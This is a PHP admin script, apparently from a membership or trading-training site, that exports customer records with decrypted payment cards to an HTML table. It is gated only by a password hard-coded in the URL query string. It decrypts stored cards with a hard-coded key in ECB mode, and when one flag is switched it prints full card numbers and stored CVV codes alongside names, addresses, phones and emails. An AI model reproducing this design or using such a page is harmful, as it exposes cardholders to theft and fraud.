<?php

if(!isset($_GET["custom_pass"])) die("error 1");

if($_GET["custom_pass"]!="3ffvsdbbrt4SSFG") die("error 2");

include_once("../lib/config.inc.php");
include_once("../lib/database.inc.php");

$start_date = "2012-03-05 00:00:00";
$end_date = "2012-03-06 00:00:00";

$process_cc = true;

$get_transactions = false;

//Cipher class
class Cipher {
    private $securekey, $iv;
    function __construct() {
        $this->securekey = hash('sha256','online trade training 10/22/10',TRUE);
        //$this->iv = mcrypt_create_iv(64);
    }
    function encrypt($input) {
        return base64_encode(mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $this->securekey, $input, MCRYPT_MODE_ECB));
    }
    function decrypt($input) {
        return trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $this->securekey, base64_decode($input), MCRYPT_MODE_ECB));
    }
}

function __($x=""){echo "\n".$x;}



$con = connect_database();


if($get_transactions) {
$sql = "SELECT h.hAmount as amount,u.* FROM mem_merchant_history h LEFT JOIN mem_user u ON u.EmailAddress=h.user_email WHERE h.BankID=30";
} else {

//data
$sql = "SELECT * FROM `mem_user` WHERE CreateTime > '".$start_date."' AND CreateTime < '".$end_date."' AND country IN ('US','NZ','CA','GB','AU') ORDER BY country";
//count
$sql2="SELECT COUNT(UserID) as total,country FROM mem_user WHERE CreateTime>'".$start_date."' and CreateTime<'".$end_date."' AND country IN('US','NZ','CA','GB','AU') group by country"; 

}

$result = mysql_query($sql);

$data = array();

//start Cipher also
$c = new Cipher;


$today = strtotime(date("m-d-Y"));

while($row = mysql_fetch_object($result)) {
	if(strlen($row->cardnumber) > 1) {
		if(strtotime($row->expiration) > $today) {
    
    //process CC card ?
    if($process_cc) {
    
    $cc_raw = $c->decrypt($row->cardnumber);
    $cc = substr($cc_raw,0,4).str_repeat("*",8).substr($cc_raw,-4);
    
    $cvv = "***";
      
    } else {
      $cc = $c->decrypt($row->cardnumber);
      $cvv = $c->decrypt($row->cvvcode);
    }
    
		$data[] = array(
      "amount"=>$get_transactions ? $row->amount:0,
			"card_number"=>$cc,
			"cvv"=>$cvv,			
			"expiration"=>date("m-d-Y",strtotime($row->expiration)),
			"name_on_card"=>$c->decrypt($row->cardname),		
      "card_type"=>$row->cardtype,
      "address"=>$row->address,
      "city"=>$row->city,
      "state"=>$row->state,
      "country"=>$row->country,
      "person_name"=>$row->firstname." ".$row->lastname,
      "firstname"=>$row->firstname,
      "lastname"=>$row->lastname,
      "phone"=>$row->phone,
      "email"=>$row->EmailAddress,
      "created"=>date("m-d-Y H:i:s",strtotime($row->CreateTime)),
		);
    }
	}
}
__("<table>");

__("<tr>");

if(!$get_transactions)
__("<td>Created(m-d-Y H:i:s)</td>");
else
__("<td>Amount</td>");

__("<td>FirstName</td>");
__("<td>LastName</td>");
__("<td>Card number</td>");
__("<td>CVV</td>");
__("<td>Expires(m-d-Y)</td>");
__("<td>Card Type</td>");
__("<td>Name On Card</td>");
__("<td>Address</td>");
__("<td>City</td>");
__("<td>State</td>");
__("<td>Country</td>");
__("<td>Phone</td>");
__("<td>Email</td>");
__("</tr>");

foreach($data as $key=>$v) {	
	
__("<tr>");

if(!$get_transactions)
__("<td>".$v["created"]."</td>");
else
__("<td>".$v["amount"]."</td>");

__("<td>".$v["firstname"]."</td>");
__("<td>".$v["lastname"]."</td>");
__("<td>"."CC:".$v["card_number"]."</td>");
__("<td>".$v["cvv"]."</td>");
__("<td>".$v["expiration"]."</td>");
__("<td>".$v["card_type"]."</td>");
__("<td>".$v["person_name"]."</td>");
__("<td>".$v["address"]."</td>");
__("<td>".$v["city"]."</td>");
__("<td>".$v["state"]."</td>");
__("<td>".$v["country"]."</td>");
__("<td>".$v["phone"]."</td>");
__("<td>".$v["email"]."</td>");
__("</tr>");
	
//	$text .= "\n ------------------------------------------------------ \n";
}

if(!$get_transactions) {
__("<tr>");
__("<td colspan='14'>Totals</td>");
__("</tr>");

  $result2=mysql_query($sql2);
  while($row2 = mysql_fetch_object($result2)) {
  
__("<tr>");
__("<td>".$row2->country."</td>");
__("<td>".$row2->total."</td>");
__("<td colspan='12'></td>");
__("</tr>");
  
  }
}

__("<table>");